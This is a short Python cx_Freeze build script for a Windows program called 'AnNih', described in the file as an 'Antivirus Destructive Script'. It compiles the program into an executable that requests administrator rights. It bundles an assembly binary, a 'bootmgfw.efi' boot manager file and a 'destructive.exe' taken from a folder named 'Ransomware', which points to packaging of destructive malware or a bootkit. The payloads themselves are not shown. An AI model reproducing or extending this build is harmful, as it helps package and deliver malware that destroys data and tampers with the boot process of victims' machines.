import os
from cx_Freeze import setup, Executable

# Get the current script directory
script_dir = os.getcwd()

# Define the executable and options
executables = [
    Executable(
        "AnNih.py",  # Your script
        target_name="AnNih.exe",  # Output executable name
        base="Win32GUI",  # Win32GUI application
        icon="assets/Annihilation.ico",  # Path to your .ico file
        uac_admin=True  # Request admin privileges
    )
]

# Define the files to be included with the executable
include_files = [
    (os.path.join(script_dir, "Assembly", "AnNih.bin"), "AnNih.bin"),  # Include AnNih.bin
    (os.path.join(script_dir, "Signing", "bootmgfw.efi"), "bootmgfw.efi"),  # Include bootmgfw.efi
    (os.path.join(script_dir, "Ransomware", "destructive.exe"), "destructive.exe")  # Include destructive.exe
]

# Build the executable with cx_Freeze
setup(
    name="AnNih",
    version="0.1",
    description="AnNih - Antivirus Destructive Script",
    options={
        "build_exe": {
            "packages": [],  # Add any required packages
            "include_files": include_files,  # Include additional files during build
        }
    },
    executables=executables
)
